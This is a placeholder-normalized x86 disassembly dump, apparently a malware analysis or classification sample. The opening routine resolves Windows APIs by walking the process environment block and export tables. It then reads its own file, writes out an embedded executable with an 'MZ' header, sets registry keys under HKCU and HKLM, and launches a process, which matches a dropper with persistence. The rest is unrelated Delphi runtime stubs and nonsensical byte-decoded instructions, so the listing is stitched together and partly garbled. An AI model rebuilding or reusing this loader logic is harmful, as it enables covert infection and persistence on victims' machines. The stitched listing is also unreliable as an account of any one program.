mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0xd0
mov [ ebp - 0x128 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x653d3f3c
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_5cb140
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x34
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov edx [ ebp - 0x294 ]
push edx
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x21
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3b
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x33
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_5cafe0
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_5cafe0
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_5cafe0
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_5cafe0
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_5cafe0
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
mov [ ebp - 0x288 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_5cafe0
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x288 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x288 ] edx
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x120 ]
push ecx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x148 ]
mov [ eax ] 0x5a
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x148 ]
mov [ edx ] 0x4d
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
mov eax [ ebp - 0x558 ]
push eax
call [ ebp - 0x28c ]
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x13c ]
mov edx [ ebp - 0x144 ]
and edx 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x574 ] 0x44
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov edx [ ebp - 0x144 ]
and edx 0x1000
je rwxdata
mov eax [ ebp - 0x574 ]
sub eax 0x1
mov [ ebp - 0x574 ] eax
mov ecx [ ebp - 0x574 ]
mov [ ebp + ecx - 0x300 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov ecx 0x5
mov [ ebp - 0x2d0 ] cx
xor eax eax
mov [ ebp - 0x2d0 ] ax
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
lea edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_5cafe0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_5cb110
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_5cb140
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
j_sub_401012
jmp sub_401012
__GetExceptDLLinfo
jmp sub_450010
sub_40105e
xor eax eax
mov al [ rw-data ]
retn
sub_401066
mov eax [ rw-data ]
retn
sub_401125
retn
sub_401126
cmp [ rw-data ] 0x0
jb r-xdata
retn
call sub_4010f3
push [ rw-data ]
call sub_455654
sub_40119c
mov eax rw-data
call sub_44e308
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
retn
push eax
call FreeLibrary
sub_4012ad
jmp sub_44c770
sub_4012b4
pop ebp
retn
sub_4012b8
sub [ rw-data ] 0x1
retn
sub_4018a8
call sub_42135c
retn
@@Unit1@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Unit1@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Unit2@Initialize
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
@@Unit2@Finalize
push ebp
mov ebp esp
add [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_40218c
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_402389
jmp sub_44c770
sub_402390
pop ebp
retn
sub_402394
sub [ rw-data ] 0x1
retn
sub_4023c1
jmp sub_44c770
sub_4023c8
pop ebp
retn
sub_4023cc
sub [ rw-data ] 0x1
retn
sub_402531
jmp sub_44c770
sub_402538
pop ebp
retn
sub_40253c
sub [ rw-data ] 0x1
retn
sub_4025e9
mov ah 0x43
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_4025fc
pushfd
retn 0x44
sub_4028cf
jmp sub_44c770
sub_4028d6
pop ecx
pop ecx
pop ebp
retn
sub_4028dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
setne [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4028f8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_402b4c
sub_4029bc
jmp sub_44c770
sub_4029c3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x48 ] edx
sub_402bfd
jmp sub_44c770
sub_402c04
pop ecx
pop ecx
pop ebp
retn
sub_402c9d
jmp sub_44c770
sub_402ca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402cc1
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
sub_402cba
jmp sub_44c770
sub_402cc1
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_402d9a
jmp sub_44c770
sub_402da1
pop ebx
mov esp ebp
pop ebp
retn
sub_402da8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_402d0c
pop ecx
pop ebp
retn
sub_403241
jmp sub_44c770
sub_403248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403265
mov eax [ ebp - 0x10 ]
call sub_44c070
retn
sub_40325e
jmp sub_44c770
sub_403265
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403282
mov eax [ ebp - 0x4 ]
call sub_403ce4
retn
sub_40327b
jmp sub_44c770
sub_403282
mov esp ebp
pop ebp
retn
sub_403518
jmp sub_44c770
sub_40351f
mov esp ebp
pop ebp
retn
sub_4037a1
jmp sub_44c770
sub_4037a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_44c070
retn
sub_4037be
jmp sub_44c770
sub_403aee
jmp sub_44c770
sub_403af5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403b12
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
sub_403b0b
jmp sub_44c770
sub_403b12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403b2f
mov eax [ ebp - 0xc ]
call sub_44c070
retn
sub_403b28
jmp sub_44c770
